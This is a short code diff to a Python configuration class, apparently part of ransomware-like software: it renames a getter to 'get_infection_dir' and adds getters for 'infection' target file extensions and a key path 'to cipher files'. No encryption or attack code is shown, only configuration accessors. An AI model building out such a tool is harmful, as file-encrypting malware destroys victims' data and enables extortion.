@@ -19,6 +19,14 @@ class Configlibrary:
         """function updates the log level version"""
         self.config['log']['level'] = level
 
-    def get_config_dir(self):
+    def get_infection_dir(self):
         """function returns the infection target directory"""
         return self.config['infection']['directory']
+
+    def get_infection_extensions(self):
+        """function returns the infection target extensions"""
+        return self.config['infection']['extensions']
+
+    def get_infection_key(self):
+        """function returns the key path to cipher files"""
+        return self.config['infection']['key']
